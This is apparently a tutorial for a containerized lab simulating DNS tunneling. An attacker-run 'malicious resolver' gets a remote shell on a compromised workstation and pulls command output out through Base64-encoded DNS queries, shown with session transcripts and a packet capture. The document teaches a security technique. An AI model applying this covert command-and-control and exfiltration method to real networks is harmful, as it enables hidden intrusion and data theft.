---
permalink: /dns-tunneling/
layout: page
---
# DNS Tunneling

## Abstract
> DNS tunneling is a technique used to bypass traditional network security measures by encapsulating non-DNS traffic within DNS packets. In this method, malicious actors encode data within DNS queries and responses, exploiting the DNS protocol's design to transfer information covertly. By leveraging DNS tunneling, attackers can establish unauthorized communication channels, exfiltrate sensitive data, or evade detection mechanisms since DNS traffic is typically allowed through firewalls and security filters. This method poses a significant threat to network security as it enables attackers to conduct activities such as command and control communications without raising suspicion. Organizations must implement robust DNS monitoring and filtering mechanisms to detect and mitigate DNS tunneling attempts effectively.

For more information, check out an article on [DNS Tunneling on the Unprotect Project website](https://unprotect.it/technique/dns-tunneling). The code for `server/malicious_resolver.py` is adapted from the code snippet provided by the Unprotect Project and was updated to include more functionality for handling non-zero exit codes, command results that are large (by chunking into multiple dns requests), and exiting the terminal. This falls under the [Defense Evasion tactic](https://attack.mitre.org/tactics/TA0005) and the [Command and Control tactic](https://attack.mitre.org/tactics/TA0011) in the MITRE ATT&CK framework. For this implementation, commands and data are encoded in [Base64](https://en.wikipedia.org/wiki/Base64). Other encoding or encryption methods could be used to make it harded for network administrators to inspect.

## Getting Started with the Lab
### Prerequisites
Before proceeding make sure you meet these requirements.
- Have `sudo` permissions to run commands on a machine you own
- Have a Linux operating system
- Have [Docker Engine](https://docs.docker.com/engine/install) installed
- Have [containerlab](https://containerlab.dev/install) installed

### Installation Steps
1. Clone [the repository](https://github.com/crollins18/dev) using `git clone`
2. Change directory into the path `dns-tunneling`
3. Change any of the environment variables in `client/.env` or `server/.env` as you want for your lab. **Note: these values should match between the two files!**
4. Build the custom images for the `client` and `server` containers by running `make build`. Your terminal output should look similar to the following.

    ```
    ┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
    └─$ make build
    docker build -t dns-server ./server
    Sending build context to Docker daemon  8.704kB

    (... more build steps here...)

    Successfully built a41caf166072
    Successfully tagged dns-server:latest

    docker build -t workstation ./client
    Sending build context to Docker daemon  19.97kB

    (... more build steps here...)

    Successfully built 928d50d4e765
    Successfully tagged workstation:latest
    ```

## Starting the Containers
Now that the containers are built, you can now run the containerlab using the `make run` script. **You will be asked to authenticate because containerlab requires sudo permissions**. Your terminal output should resemble to snippet below.
```
┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
└─$ make run
sudo containerlab deploy --reconfigure
[sudo] password for ccrollin: 
INFO[0000] Containerlab v0.52.0 started                 
INFO[0000] Parsing & checking topology file: dns-tunneling.clab.yml 
INFO[0000] Removing /home/ccrollin/dns-tunneling/clab-dns-tunneling directory... 
INFO[0000] Creating docker network: Name="clab", IPv4Subnet="172.20.20.0/24", IPv6Subnet="2001:172:20:20::/64", MTU=1500 
INFO[0000] Creating lab directory: /home/ccrollin/dns-tunneling/clab-dns-tunneling
INFO[0000] Creating container: "dns-server"
INFO[0000] Creating container: "home-router"
INFO[0000] Creating container: "company-router"
INFO[0002] Running postdeploy actions for Nokia SR Linux 'company-router' node
INFO[0002] Created link: dns-server:eth1 <--> home-router:e1-1
INFO[0002] Created link: company-router:e1-2 <--> home-router:e1-2
INFO[0002] Running postdeploy actions for Nokia SR Linux 'home-router' node
INFO[0003] node "dns-server" turned healthy, continuing
INFO[0003] Creating container: "workstation-1"
INFO[0003] Created link: workstation-1:eth1 <--> company-router:e1-1
INFO[0026] Adding containerlab host entries to /etc/hosts file
INFO[0026] Adding ssh config for containerlab nodes
```

To get more information about the containers running you can run `docker ps` to see container IDs, names, exposed ports, and current processes they are running. Below is a sample of what `docker ps` should return after calling `make run`.
```
┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
└─$ docker ps
CONTAINER ID   IMAGE                   COMMAND                  CREATED         STATUS                   PORTS                                   NAMES
0ee611e570ce   workstation:latest      "python3"                7 minutes ago   Up 7 minutes                                                     clab-dns-tunneling-workstation-1
832341f0a80c   dns-server:latest       "python3"                7 minutes ago   Up 7 minutes (healthy)   0.0.0.0:5053->53/tcp, :::5053->53/tcp   clab-dns-tunneling-dns-server
90e74c8e13ce   ghcr.io/nokia/srlinux   "/tini -- fixuid -q …"   7 minutes ago   Up 7 minutes                                                     clab-dns-tunneling-home-router
62036128be3f   ghcr.io/nokia/srlinux   "/tini -- fixuid -q …"   7 minutes ago   Up 7 minutes                                                     clab-dns-tunneling-company-router
```
Notice that we have 4 (four) containers with names `clab-dns-tunneling-company-router`, `clab-dns-tunneling-dns-server`, `clab-dns-tunneling-home-router`, and `clab-dns-tunneling-workstation-1`

The network topology can be visualized as such. We can think of an attacker who setups up the (malicious) DNS server on their home network. To reach the internet, the DNS server is connected to their home router. The link between the home router and the company router represents the logical connection these two routers would have provided by the internet. 

In a situation where we assume apriori an attacker has gained initial access to the comporate workstation, they will need to move the data off the workstation in an established channel that is persisted for long term use. This is where DNS tunneling comes in to replace the initial (and often trivial) method of access to data.

Because the attacker controls the workstation, they can make the workstation ask for DNS record requests over the internet to our special DNS server (rather than the corporate DNS servers).
<p align="center"><img src="/dns-tunneling/tutorial/network-topology.png" alt="network topology graphy" width="650"/></p>

## Running our Simulation
To access the server and workstation Linux containers, we will run the `bash` terminal on each one so we then issue more commands. To do this, use `make terminal-client` and `make terminal-server` as seen below:

#### Running `bash` on the `clab-dns-tunneling-workstation-1` Container
```
┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
└─$ make terminal-client
docker exec -it clab-dns-tunneling-workstation-1 /bin/bash
root@workstation-1:/usr/src/app# 
```

#### Running `bash` on the `clab-dns-tunneling-dns-server` Container
```
┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
└─$ make terminal-server
docker exec -it clab-dns-tunneling-dns-server /bin/bash
root@dns-server:/usr/src/app# 
```

From here we can interactively control the two endpoints on our network. At this time, the router containers are acting are intermediate couriers that move packets across the network and do not need any extra control by us.

<table border='1'>
    <tr>
        <th><h3>Server (running <a href="/dns-tunneling/server/malicious_resolver.py"><code>malcious_resolver.py</code></a>)</h3></th>
        <th><h3>Client (running <a href="/dns-tunneling/client/dns_lookup.py"><code>dns_lookup.py</code></a>)</h3></th>
    </tr>
    <tr>
        <td width="50%">
            Start the malicious resolver.
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py</pre>
        </td>
        <td width="50%">
            Start DNS lookup requests.
            <pre>root@workstation-1:/usr/src/app# python dns_lookup.py</pre>
        </td>
    </tr>
    <tr>
        <td width="50%">
            Notice that we now have a shell and that the hostname of the endpoint we have a shell to is printed (ex. <code>workstation-1</code>).
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py 
workstation-1
shell> </pre>
        </td>
        <td width="50%">
        </td>
    </tr>
    <tr>
        <td width="50%">
            Now we can issue a command to run on the workstation endpoint (ex. <code>ls</code>).
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py 
workstation-1
shell> ls
Dockerfile
capture.sh
captures
dns_lookup.py
requirements.txt</pre>
        From here you can continue to issue commands until you are satisfied and want to terminate the DNS tunneling session.
        </td>
        <td width="50%">
        </td>
    </tr>
    <tr>
        <td width="50%">
            Lets try issuing the <code>exit</code> command to exit the shell. Our specific implementation does not allow for the <code>exit command</code> and instead we are told to use <code>CTRL+C</code>.
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py 
workstation-1
shell> ls
Dockerfile
capture.sh
captures
dns_lookup.py
requirements.txt
shell> exit
To exit, use CTRL+C.
shell> ^C
Detected CTRL+C. Exiting now.
root@dns-server:/usr/src/app#</pre>
        At this point, we are returned to our shell on the DNS server.
        </td>
        <td width="50%">
        On the DNS requesting side we can also terminate it from running by doing <code>CTRL+C</code>.
<pre>root@workstation-1:/usr/src/app# python dns_lookup.py 
^C
Detected CTRL+C. Exiting now.
root@workstation-1:/usr/src/app#</pre>
        At this point, we are returned to our shell on the workstation.
        </td>
    </tr>
</table>

## Packet Capture
One way to confirm that we are communicating successfully between the "compromised" host and the C2 server is by looking at packets that are transferred across the network. To do this, we can use the [`tshark`](https://tshark.dev) tool to capture packets. A shell script called `capture.sh` will be available on the client. This shell script will run the typical `dns_lookup.py` Python file from the previous example, while also simulatenously starting `tshark` capture on the client. The [`capture.sh`](/dns-tunneling/client/capture.sh) file can be inspected using this hyperlink if you are curious.

### Starting Capture
<table border='1'>
    <tr>
        <th><h3>Server (running <a href="/dns-tunneling/server/malicious_resolver.py"><code>malcious_resolver.py</code></a>)</h3></th>
        <th><h3>Client (running <a href="/dns-tunneling/client/capture.sh"><code>capture.sh</code></a>)</h3></th>
    </tr>
    <tr>
        <td width="50%">
            Start the malicious resolver.
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py</pre>
        </td>
        <td width="50%">
            Start capture.
            <pre>root@workstation-1:/usr/src/app# ./capture.sh 
Running as user "root" and group "root". This could be dangerous.
Capturing on 'eth0'
 ** (tshark:19) 22:26:16.975217 [Main MESSAGE] -- Capture started.
 ** (tshark:19) 22:26:16.975309 [Main MESSAGE] -- File: "captures/capture.pcapng"</pre>
        </td>
    </tr>
    <tr>
        <td width="50%">
            Just like before, we have the terminal of our workstation and can start to issue commands. (ex. <code>ls</code>).
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py
workstation-1
shell> ls
Dockerfile
capture.sh
captures
dns_lookup.py
requirements.txt</pre>
        </td>
        <td width="50%">
        From here, we should notice that packets have been collected on the client. At the bottom of the <code>tshark</code> capture output we can see a count for the number of packets collected. <b>This number is bolded in the snippet.</b>
        <pre>root@workstation-1:/usr/src/app# ./capture.sh 
Running as user "root" and group "root". This could be dangerous.
Capturing on 'eth0'
 ** (tshark:59) 22:31:57.063783 [Main MESSAGE] -- Capture started.
 ** (tshark:59) 22:31:57.063878 [Main MESSAGE] -- File: "captures/capture.pcapng"
<b>13</b> </pre>
        </td>
    </tr>
    <tr>
        <td width="50%">
            Use <code>CTRL+C</code> to exit.
            <pre>root@dns-server:/usr/src/app# python malicious_resolver.py 
workstation-1
shell> ls
Dockerfile
capture.sh
captures
dns_lookup.py
requirements.txt
shell> ^C
Detected CTRL+C. Exiting now.
root@dns-server:/usr/src/app#</pre>
        At this point, we are returned to our shell on the DNS server.
        </td>
        <td width="50%">
        On the client side we can also terminate packet capture from <code>tshark</code> by doing <code>CTRL+C</code>.
<pre>root@workstation-1:/usr/src/app# ./capture.sh 
Running as user "root" and group "root". This could be dangerous.
Capturing on 'eth0'
 ** (tshark:59) 22:31:57.063783 [Main MESSAGE] -- Capture started.
 ** (tshark:59) 22:31:57.063878 [Main MESSAGE] -- File: "captures/capture.pcapng"
13 ^C
tshark: 
root@workstation-1:/usr/src/app# </pre>
        At this point, we are returned to our shell on the workstation.
        </td>
    </tr>
</table>


### Viewing Capture Results
All packets captures are stored by default in a file named `capture.pcapng` on the client container itself. A Docker volume has been established that syncs this file between the client Docker container and the host operating system that is running the containerlab. It is worth noting that `.pcapng` files are binary files that need to be read using another applicaton. Therefore, we are using [`tshark`](https://tshark.dev) with the `-r` flag to read from the `client/captures/capture.pcapng` saved file. [Wireshark](https://www.wireshark.org) is a GUI based application that could also be used to read the `capture.pcapng` file.

Here are the 13 packets that we captured. Notice the DNS queries and responses, both with a Base64 encoded string as a zone record.

```
┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
└─$ tshark -r client/captures/capture.pcapng
    1 0.000000000  172.20.20.4 → 172.20.20.5  DNS 116 Standard query response 0xbe4f A d29ya3N0YXRpb24tMQo=.mydomain.local A 172.20.20.4
    2 0.004345400  172.20.20.5 → 172.20.20.4  DNS 107 Standard query 0xa30a A RG9ja2VyZmlsZQpjYXB0dXJlLnNoCmNh.mydomain.local
    3 0.004749100  172.20.20.5 → 172.20.20.4  DNS 107 Standard query 0xfdba A cHR1cmVzCmRuc19sb29rdXAucHkKcGFj.mydomain.local
    4 0.005361900  172.20.20.5 → 172.20.20.4  DNS 107 Standard query 0xae8b A a2V0X2NhcHR1cmUucHkKcmVxdWlyZW1l.mydomain.local
    5 0.005519400  172.20.20.4 → 172.20.20.5  DNS 136 Standard query response 0xa30a A RG9ja2VyZmlsZQpjYXB0dXJlLnNoCmNh.mydomain.local A 172.20.20.4
    6 0.005753200  172.20.20.5 → 172.20.20.4  DNS 87 Standard query 0xd9a8 A bnRzLnR4dAo=.mydomain.local
    7 0.005766000  172.20.20.4 → 172.20.20.5  DNS 136 Standard query response 0xfdba A cHR1cmVzCmRuc19sb29rdXAucHkKcGFj.mydomain.local A 172.20.20.4
    8 0.006702800  172.20.20.4 → 172.20.20.5  DNS 136 Standard query response 0xae8b A a2V0X2NhcHR1cmUucHkKcmVxdWlyZW1l.mydomain.local A 172.20.20.4
    9 1.865723411 02:42:ac:14:14:05 → 02:42:ac:14:14:04 ARP 42 Who has 172.20.20.4? Tell 172.20.20.5
   10 1.865841611 02:42:ac:14:14:04 → 02:42:ac:14:14:05 ARP 42 172.20.20.4 is at 02:42:ac:14:14:04
   11 2.176001613 fe80::1821:ff:fe00:0 → ff02::2      ICMPv6 70 Router Solicitation from 1a:21:00:00:00:00
   12 5.055731214 02:42:ac:14:14:04 → 02:42:ac:14:14:05 ARP 42 Who has 172.20.20.5? Tell 172.20.20.4
   13 5.055741314 02:42:ac:14:14:05 → 02:42:ac:14:14:04 ARP 42 172.20.20.5 is at 02:42:ac:14:14:05
```

#### Packet Capture File
A sample packet capture file can be downloaded at [`tutorial/dns-tunneling.pcapng`](/dns-tunneling/tutorial/dns-tunneling.pcapng).

## Stopping the Simulation
When you are done with the simulation, you can stop the containerlab, using the `make destroy` script file. **You will be asked to authenticate because containerlab requires sudo permissions**. Your terminal output should resemble to snippet below.
```
┌──(ccrollin㉿thinkbox)-[~/dev/dns-tunneling]
└─$ make destroy
sudo containerlab destroy
INFO[0000] Parsing & checking topology file: dns-tunneling.clab.yml 
WARN[0000] errors during iptables rules install: not available 
INFO[0000] Destroying lab: dns-tunneling                
INFO[0001] Removed container: clab-dns-tunneling-workstation-1 
INFO[0001] Removed container: clab-dns-tunneling-company-router 
INFO[0001] Removed container: clab-dns-tunneling-home-router 
INFO[0001] Removed container: clab-dns-tunneling-dns-server 
INFO[0001] Removing containerlab host entries from /etc/hosts file 
INFO[0001] Removing ssh config for containerlab nodes   
WARN[0002] errors during iptables rules removal: not available 
docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

At the end of the terminal output, we see that `docker ps` was executed and that no containers are currently up and running. This means that the containerlab was successfully stopped. **If you have an issue stopping the containerlab, you can force stop the containers using the `make force-destroy` script**.